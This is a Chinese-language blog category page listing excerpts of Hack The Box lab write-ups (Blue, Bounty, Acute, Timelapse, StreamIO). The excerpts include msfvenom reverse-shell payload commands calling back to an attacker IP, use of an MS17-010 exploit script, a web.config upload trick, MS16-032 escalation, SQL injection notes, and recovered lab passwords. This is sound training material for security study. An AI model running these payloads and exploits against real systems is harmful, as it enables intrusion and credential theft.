<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB | 养猪日记</title>
<meta name=keywords content><meta name=description content="养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/categories/htb/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://yangzhuzai.github.io/categories/htb/index.xml><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/categories/htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB"><meta property="og:description" content="养猪日记"><meta property="og:type" content="website"><meta property="og:url" content="https://yangzhuzai.github.io/categories/htb/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB"><meta name=twitter:description content="养猪日记"></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/categories/>Categories</a></div><h1>HTB</h1></header><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0X005 Blue</h2></header><div class=entry-content><p>端口扫描 获取立足点 本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：
但是尽量不适用msf吧：
这个失败了：
https://github.com/mez-0/MS17-010-Python
换一个：
简书的讲解：
https://www.jianshu.com/p/430b2bbfdecc
这种方式也失败了。
最后使用了，这个办法：
生成一个木马：
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe
编辑zzz_exploit.py：
添加两个\
这个位置，添加相关操作：
使用vim可能会报错，可以使用记事本打开，可能是vim的问题：
运行：
python2 zzz_exploit.py 10.10.10.40 ntsvcs</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;31 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X005 Blue" href=https://yangzhuzai.github.io/posts/htb/0x005-blue/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0X006 Bounty</h2></header><div class=entry-content><p>端口扫描 获取立足点 目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：
还有一个：
先上传一个试试：
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx
看样子是后端校验：
这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：
/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt
发现congfig是可以使用的：
这个后缀在IIS7.0以上是可以getshell的：
https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/
同时可以在github找到相关项目：
https://github.com/0xPurpl3john/web.config
提权 也是没有补丁的：
https://github.com/zcgonvh/MS16-032/releases/tag/Release
运行之前需要重新弹个shell:</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;26 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X006 Bounty" href=https://yangzhuzai.github.io/posts/htb/0x006-bounty-/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0X007 Acute</h2></header><div class=entry-content><p>端口扫描 获取立足点 端口扫描没发现东西：
打开网站看一下：
修改hosts:
然后这里是我看到了，但是不知道怎么利用的：
这里的用户名是看到了：
同时，这个word也看到了：
但是没看文件属性：
然后是文件内容，英语挺重要：
原始密码是：Password1!
然后这里其实涉及了一个知识盲区，PSWA是什么东西：
然后上面说到的会议连接在这里：
打开页面：
https://atsserver.acute.local/Acute_Staff_Access
然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：
然后问了一下GPT：
也就是说可能是这种变形：
账户名是：EDavies
反弹shell:
这里看是下载成功了，但是好像有杀软，被杀了：
然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：
所以还是英语不太好，吃大亏了：
使用Get-ChildItem -Force可以查看隐藏文件
权限提升 好吧，这里还是没办法，参考官方文档，只能使用msf了：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;174 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X007 Acute" href=https://yangzhuzai.github.io/posts/htb/0x007-acute/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0X008 Timelapse</h2></header><div class=entry-content><p>端口扫描 获取立足点 smb匿名访问：
疑似重置后的密码？
7c3XlgsE
有密码：
破解：
但是这东西怎么用呢，后面刚好培训遇到了，pfx是一种存储个人信息的文件，简单理解可以理解为ssh密钥文件，不过普遍都是加密状态，需要解密，破解使用john即可：
thuglegacy
然后需要将从pfx格式的文件，
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
提权 powershell历史文件位置：
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
可以看到账号密码：
$p = ConvertTo-SecureString ‘E3R$Q62^12p7PLlC%KWaxuaV’ -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential (‘svc_deploy’, $p)
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;61 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X008 Timelapse" href=https://yangzhuzai.github.io/posts/htb/0x008-timelapse/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0X009 StreamIO</h2></header><div class=entry-content><p>端口扫描 获取立足点 从端口开放情况来看，值得关注的端口有：80、389、443、445、3268、5985：
先看445和389，3268等：
那么突破口应该就在80或者443了：
简单看了一下首页，没有东西，目录扫描看看：
有注册和登录：
简单试了一下，好像没有万能密码，注册一个看看：
但是不让登录：
查看证书，发现域名好像不对：
访问这个网站：
好像也没有东西，再扫一下：
发现新内容：
疑似sql注入：
输入1‘–+
但是好像有拦截：
order by用不了，只能用select 挨个操作：
测了半天，发现是个sqlserver:
当前数据库名称为
STREAMIO
表名：
列名：
爆用户：
James ,Theodore ,Samantha ,Lauren ,William ,Sabrina ,Robert ,Thane ,Carmon ,Barry ,Oliver ,Michelle ,Gloria ,Victoria ,Alexendra ,Baxter ,Clara ,Barbra ,Lenord ,Austin ,Garfield ,Juliette ,Victor ,Lucifer ,Bruno ,Diablo ,Robin ,Stan ,yoshihide ,admin ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,aikun
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;200 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X009 StreamIO" href=https://yangzhuzai.github.io/posts/htb/0x009-streamio/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://yangzhuzai.github.io/categories/htb/>«&nbsp;Prev&nbsp;
</a><a class=next href=https://yangzhuzai.github.io/categories/htb/page/3/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>